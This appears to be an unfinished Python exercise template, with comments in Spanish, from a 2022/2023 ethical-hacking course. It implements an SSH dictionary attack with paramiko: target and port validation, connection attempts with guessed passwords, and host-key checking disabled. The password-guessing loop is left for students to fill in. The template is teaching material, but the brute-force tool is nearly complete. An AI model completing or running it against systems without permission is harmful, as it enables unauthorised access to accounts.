#*********************************************************************************************************************************
#Curso "Python para hacking ético" Tknika 2022/2023
#RESUMEN DEL SCRIPT:
#Realizamos un ataque de diccionario contra la IP introducida por el usuario. Éste deberá aportar, además, un nombre de usuario y
#el puerto en el que el servicio está a la escucha. 
#*********************************************************************************************************************************

import paramiko
import ipaddress
import socket
import os

#Esta función crea una sesión de cliente SSH para probar el nombre de usuario y la contraseña
#    Argumentos:
#      contraseña: contiene una cadena de cada línea del archivo de contraseñas
class ssh:
    def __init__(self):
        self.host = ''
        self.usuario = ''
        self.password = ''
        self.puerto = 0
        self.cliente = None
        
    #Función que comprueba si un valor es una IP válida; si no lo es, comprueba si es un nombre de host válido. 
    def validar_destino(self):
        try:
            ipaddress.ip_address(self.host)
            return True 
        except ValueError:
            try:
                socket.gethostbyname(self.host)
                return True
            except socket.error:
                return False

    #Función que comprueba si un valor es un puerto válido: está vacío (puerto por defecto) o está entre 1 y 65535
    def validar_puerto(self):
        if self.puerto=="":
            return True
        else:
            try:
                puerto_destino = int(self.puerto)
                if 1 <= puerto_destino <= 65535:
                    return True
                else:
                    return False
            except ValueError:
                return False
            
    #Función para solicitar al usuario que introduzca los datos que vamos a necesitar para conectarnos al servidor ssh: IP, puerto de destino, y usuario. 
    def solicitar_datos_usuario(self):
        try:
            destino_correcto=False
            puerto_correcto=False
            usuario_correcto=False
            puerto_activo=False
            while not puerto_activo:
                while not destino_correcto:
                    self.host = input('>> Introduce la dirección del host objetivo (IP o nombre de host): ')
                    if self.validar_destino():
                        destino_correcto=True
                while not puerto_correcto:
                    self.puerto = input('>> Introduce el puerto objetivo, entre 1 y 65535 (déjalo en blanco para el valor predeterminado -22-): ')
                    if self.validar_puerto():
                        puerto_correcto=True
                        if self.puerto == "":
                            self.puerto = 22
                #Comprobamos al menos si el puerto está abierto, ya que, si no, no merece la pena seguir adelante, por lo que pediremos de nuevo al usuario
                #que introduzca la IP y el puerto.
                try:
                    with socket.create_connection((self.host, self.puerto), timeout=5):
                        puerto_activo=True
                except (socket.error, socket.timeout):
                    print (f"El puerto {self.puerto} de la dirección IP {self.host} no está accesible")
                    destino_correcto=False
                    puerto_correcto=False   
            while not usuario_correcto:
                self.usuario = input('>> Introduce un nombre de usuario: ')
                if self.usuario != "":
                    usuario_correcto=True
        except ValueError:
            print ("Ha ocurrido un error inesperado...")
            
    #Función en la que se efectúa la conexión, controlando los posibles errores. 
    def conectar_ssh(self):
        #La variable cliente es un objeto de la clase paramiko.SSHClient(), y representa la conexión SSH establecida con el servidor remoto
        self.cliente = paramiko.client.SSHClient()
        #Añade automáticamente la clave para evitar la impresión de advertencias de política de clave de host. Hay que tener cuidado con ello porque
        #nos ofrece comodidad, pero entraña cierto riesgo de seguridad. Así que, dependiendo del uso, esta línea puede ser obviada. 
        self.cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            # Intenta la conexión con las credenciales proporcionadas por el usuario
            self.cliente.connect(self.host, port=self.puerto, username=self.usuario, password=self.password)
        # Si las credenciales son incorrectas, capturamos el error
        except paramiko.AuthenticationException:
            self.cliente.close()
            return False

        # Si ha habido un error de conexión con el objetivo, controlamos el error
        except OSError:
            print ("Error al conectarse al servidor SSH")
            self.cliente.close()
            return False
            print ("Intento fallido. No hemos podido conectar con el servidor en esta ocasión.")

        # Maneja la interrupción del usuario con Ctrl+C
        except KeyboardInterrupt:
            self.cliente.close()
            return False
        # Si no ocurre ninguna de las excepciones, asumimos que la contraseña ha sido encontrada
        else:
            return True

# (◕‿−) A partir de aquí, introducir todo el código que falta
if __name__ == "__main__":   
    print('\n[+] Ataque de Diccionario SSH')
    #(◕‿−) Creamos un objeto de la clase ssh
    
    #(◕‿−) solicitamos al usuario los datos que vamos a necesitar
    
    fichero_correcto=False
    #Pedimos al usuario que introduzca la ruta de un archivo que contenga las contraseñas. Debe ser un archivo con una contraseña por línea.
    while not fichero_correcto:
            ruta_fichero = input('>> Introduce la ruta al archivo de contraseñas (una contraseña por línea): ')
            if ruta_fichero != "":
                if os.path.exists(ruta_fichero):
                    fichero_correcto=True
                else:
                    print ('\n El archivo ' + ruta_fichero + ' no existe')
    # Abrir y leer el archivo de contraseñas
    try:
        fichero_diccionario = open(ruta_fichero, 'r')
    # Capturar errores genéricos de lectura de archivos
    except ValueError:
        print ("Error al abrir el archivo" + fichero_diccionario)

    #Inicializamos el contador de intentos a 0
    contador_contraseñas = 0
    #Varable para guardar si la password ha sido encontrada
    encontrada=False
    # Leemos la primera contraseña
    contraseña_ssh=fichero_diccionario.readline().strip('\n')
    #(◕‿−)Mientras exista una contraseña y la correcta no haya sido encontrada

        #(◕‿−)Sumamos uno al contador de contraseñas
    
        #(◕‿−)Imprimimos el número de intento por el que vamos y la contraseña con la que se prueba.
        #EJEMPLO DE FORMATO DE IMPRESIÓN: [-] Intento 1: root ...[-] Intento 2: hello ...[-] Intento 3: password123 ...

        #(◕‿−)Asignamos la contraseña al atributo correspondiente del objeto ssh

        #(◕‿−)Intentamos realizar la conexión ssh, y asignamos la salida del método correspondiente a la variable "encontrada". En el momento en el que esta variable tome el valor True, significará que
        #la contraseña ha sido encontrada, y la ejecución dejará de entrar en el bucle. 

        #(◕‿−)Leemos la siguiente línea del fichero y se la asignamos a la variable "contraseña_ssh"

    #Si no se ha encontrado ninguna contraseña, se lo indicamos al usuario. 
    if not encontrada:
        print ("\nNo hemos encontrado ninguna contraseña para el usuario "+objeto_ssh.usuario+ ".\nComprueba si el nombre de usuario es correcto; y, si lo es, utiliza un diccionario más extenso.")
    #Si la encontramos, la escribimos junto con el usuario 
    else:
        print ("\n¡Bien, contraseña encontrada!. La contraseña del usuario " + objeto_ssh.usuario + ' es: ' + objeto_ssh.password)
    objeto_ssh.cliente.close()

    # Cerramos el fichero 
    fichero_diccionario.close()
    exit()
